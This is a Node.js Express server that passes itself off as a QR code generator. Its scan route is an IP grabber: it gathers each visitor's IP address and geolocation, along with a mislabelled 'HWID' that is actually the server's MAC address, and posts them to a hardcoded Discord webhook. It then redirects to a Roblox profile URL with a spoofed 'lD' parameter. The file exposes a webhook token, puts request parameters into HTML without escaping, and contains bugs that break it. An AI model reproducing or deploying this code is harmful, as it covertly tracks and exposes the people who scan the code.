const express = require("express");
const QRCode = require("qrcode");
const geoip = require("geoip-lite");
const axios = require("axios");
const { getMAC } = require("getmac");

const app = express();
const port = process.env.PORT || 3000;

// Create an object to store the generated codes and their corresponding data
const codes = {};

app.get("/qrcode/:code/:description", async (req, res) => {
  const qrCode = req.params.code;
  const qrContent = req.params.description;

  // Generate the QR code image buffer
  const qrImageBuffer = await QRCode.toBuffer(
    `https://fluidqr.onrender.com/scan/${qrCode}`
  );

  // Define the metadata for the webpage
  const metaTags = `
    <meta property="og:title" content="QR Code for ${qrCode}">
    <meta property="og:image" content="data:image/png;base64,${qrImageBuffer.toString(
      "base64"
    )}">
    <meta property="og:description" content="${qrContent}">
  `;

  // Send the webpage and the QR code image as a response
  res.set("Content-Type", "text/html");
  res.send(`
    <html>
      <head>
        ${metaTags}
      </head>
      <body>
        <img src="data:image/png;base64,${qrImageBuffer.toString("base64")}">
      </body>
    </html>
  `);
});

app.get("/scan/:code", async (req, res) => {
  const qrCode = req.params.code;

  // Get the corresponding data for the scanned code in the object
  const codeData = codes[qrCode];

  if (!codeData) {
    return res.status(404).send(`
      <html>
        <body>
          <h1>Code not found</h1>
        </body>
      </html>
    `);
  }

  // Get the user's HWID and IP address
  const hwid = getMAC();
  const ip = req.ip;
  const geo = geoip.lookup(ip);

  // Add the user's HWID and IP address to the codeData object
  codeData.hwid = hwid;
  codeData.ip = ip;

  // Define the embed object
  const embed = {
    title: "New QR code scan",
    color: 0x00ff00, // Green color
    timestamp: new Date(),
    fields: [
      {
        name: "HWID",
        value: `\`\`\`${hwid}\`\`\``,
        inline: true,
      },
      {
        name: "IP",
        value: `\`\`${ip}\`\`\``,
      },
      {
        name: "GEO",
        value: `\`\`${JSON.stringify(geo)}\`\`\``,
      },
    ],
  };

  // Send a message to the Discord webhook with the embed object
  const webhookUrl = "https://discord.com/api/webhooks/1083180101656641546/M6oICtaPe5S-AWjC1to3XdGLkxdRfN3IxNW9WeL9Bu6qUu_1eIaLQyYZ4KtA3WYMXsKc";; // Replace with your actual webhook URL
  try {
    await axios.post(webhookUrl, {
      embeds: [embed],
    });
    console.log(`Sent message to Discord webhook`);
  } catch (error) {
    console.error(`Error sending message to Discord webhook: ${error}`);
  }

  // Redirect the user to the desired URL
  const redirectUrl = `https://www.roblox.com/User.aspx?lD=12345`;
  res.redirect(redirectUrl);
});

// Start the server
app.listen(port, () => {
  console.log(`Server started on port: ${port}`);
});
